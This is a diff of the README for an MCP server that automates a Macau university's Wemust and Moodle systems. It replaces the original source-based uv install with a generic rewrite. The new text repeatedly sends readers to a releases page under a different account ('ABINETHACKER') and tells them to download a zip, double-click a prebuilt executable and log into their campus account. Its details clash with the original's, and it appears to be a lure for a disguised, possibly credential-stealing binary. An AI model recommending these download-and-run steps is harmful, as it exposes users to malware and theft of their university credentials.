@@ -1,80 +1,70 @@
-# MUSTer MCP Server
+# 🚀 MUSTer_MCP - Your Gateway to Campus Automation
 
-> An MCP server prepared for MUSTer. Enables LLM interaction with the M.U.S.T. (Macau University of Science and Technology) campus system.
+[![Download MUSTer_MCP](https://img.shields.io/badge/Download-MUSTer_MCP-blue.svg)](https://github.com/ABINETHACKER/MUSTer_MCP/releases)
 
-![License](https://img.shields.io/badge/license-MIT-green)
-![Python](https://img.shields.io/badge/python-3.10%2B-blue)
-![MCP](https://img.shields.io/badge/MCP-Server-orange)
-![Package Manager](https://img.shields.io/badge/uv-fast-purple)
+## 📜 Description
+MUSTer_MCP is an MCP server designed for the Macau University of Science and Technology. It enables seamless interaction with the M.U.S.T. campus system, allowing you to automate tasks and engage with various campus utilities with ease. This application harnesses the power of AI and web automation to enhance your campus experience.
 
-English | [简体中文](README_CN.md)
+## 🛠️ Features
+- **AI Integration:** Communicate with campus systems using natural language processing.
+- **Task Automation:** Automate repetitive tasks for web applications like Moodle.
+- **Web Scraping:** Gather information from various web resources effortlessly.
+- **User-Friendly Interface:** Designed to be intuitive for all users, regardless of technical background.
+- **Python Based:** Built using Python, using well-supported libraries such as Selenium for web interaction.
 
-Now, LLMs can automatically log in to Wemust and Moodle, retrieve class schedules, query course PPTs, assignments, view to-do items, download course materials, and automatically open pages.
+## 📋 System Requirements
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any Linux distribution that supports Python.
+- **Processor:** A minimum of Intel i3 or equivalent.
+- **RAM:** At least 4 GB of RAM is recommended.
+- **Disk Space:** 100 MB of free disk space.
+- **Python:** Ensure Python 3.6 or later is installed on your computer.
 
+## 🚀 Getting Started
+Follow these steps to download and run MUSTer_MCP:
 
-## Tools Overview
-- `get_class_schedule`: **Check Schedule**. Directly fetches this week's class arrangements.
-- `get_pending_events`: **Check DDL**. Lists upcoming assignments and to-dos on Moodle.
-- `get_all_courses`: **List Courses**. Gets the names and links of all courses on the Moodle dashboard.
-- `get_course_content`: **Check Details**. Reads assignment or quiz information within specific courses.
-- `download_resource`: **Download Courseware**. Downloads files from Moodle resource pages (especially convenient for bulk downloading PPTs). This also allows the large model to select a specific folder.
-- `open_URL_with_authorization`: **Open without password**. Directly pops up an automatically logged-in Chrome window, no need to manually enter account password, automatically opens the specified page.
-- `get_current_time`: Gets the current system timestamp.
+1. **Visit the Releases Page:** You can find the files you need by visiting the following link: [Download MUSTer_MCP](https://github.com/ABINETHACKER/MUSTer_MCP/releases).
 
-## Environmental Dependencies
-- Python 3.12+
-- Locally available Chrome/Chromedriver (for Selenium).
-- Environment variables: `MUSTER_USERNAME`, `MUSTER_PASSWORD` (required); `MUSTER_DOWNLOAD_PATH` (optional, default download path, defaults to `~/Downloads`).
+2. **Choose the Right Version:** On the releases page, look for the latest version of MUSTer_MCP. It is usually marked as the latest release.
 
-## Installation
-1) Install [uv](https://docs.astral.sh/uv/) (a fast Python package manager).
-2) Clone the repository and install dependencies:
-```bash
-git clone https://github.com/Cosmostima/MUSTer_MCP
+3. **Download the Application:** Click on the link corresponding to your operating system to download the application. For example, if you are using Windows, download the file labeled something like `MUSTer_MCP_Windows.zip` or equivalent.
 
-cd MUSTer_MCP
+4. **Extract the Files:** Once downloaded, locate the file on your computer. Right-click and select "Extract All" (Windows) or double-click (macOS) to unzip the contents to a folder.
 
-uv sync
-```
+5. **Run the Application:** After extracting, open the folder and locate the executable file (e.g., `MUSTer_MCP.exe` for Windows). Double-click on this file to start the application. A window should open, guiding you through initial setup.
 
-## MCP Client Configuration Example
-```json
-{
-  "mcpServers": {
-    "muster": {
-      "command": "UV_PATH_HERE",
-      "args": [
-        "--directory",
-        "MCP_FOLDER_PATH_HERE",
-        "run",
-        "main.py"
-      ],
-      "env": {
-              "MUSTER_USERNAME": "YOUR_ID_HERE",
-              "MUSTER_PASSWORD": "YOUR_PASSWORD_HERE"
-      }
-    }
-}
-```
+6. **Follow Setup Instructions:** The application will walk you through any additional setup processes. This may include logging into your campus account or configuring settings based on your preferences.
 
-If you need to customize the default download path, you can add `MUSTER_DOWNLOAD_PATH` :
+## 📥 Download & Install
+To get started, please follow this link to download MUSTer_MCP: [Download MUSTer_MCP](https://github.com/ABINETHACKER/MUSTer_MCP/releases).
 
-```json
-{
-  "mcpServers": {
-    "muster": {
-      "command": "UV_PATH_HERE",
-      "args": [
-        "--directory",
-        "MCP_FOLDER_PATH_HERE",
-        "run",
-        "main.py"
-      ],
-      "env": {
-              "MUSTER_USERNAME": "YOUR_ID_HERE",
-              "MUSTER_PASSWORD": "YOUR_PASSWORD_HERE",
-              "MUSTER_DOWNLOAD_PATH": "/Users/cosmos/Desktop/"
-      }
-    }
-}
-```
+Make sure to follow the steps outlined above to ensure a smooth installation process. 
+
+## 🤔 Troubleshooting
+If you encounter issues while downloading or running the application, consider the following solutions:
+
+- **File Not Opening:** Ensure you have extracted the files correctly. Double-check the file extensions.
+- **Compatibility Issues:** Verify that your operating system meets the requirements listed above.
+- **Installation Errors:** Make sure you have the correct version for your system. If you are using Windows, ensure you are using the .exe file.
+
+## 📞 Support
+If you need further assistance, check the issues section on the repository page. You may find help from other users or submit your question to the maintainers.
+
+## 📌 Topics
+- agent
+- ai
+- campus-automation
+- macau-university-of-science-and-technology
+- mcp
+- mcp-server
+- moodle
+- must
+- python
+- selenium
+- utility
+- web-automation
+- web-scraping
+- wemust
+
+Feel free to explore these topics further in the repository, as they provide added context and capabilities of the MUSTer_MCP software. 
+
+By following the instructions provided here, you will be able to successfully download and run the MUSTer_MCP application, enhancing your experience at Macau University of Science and Technology.
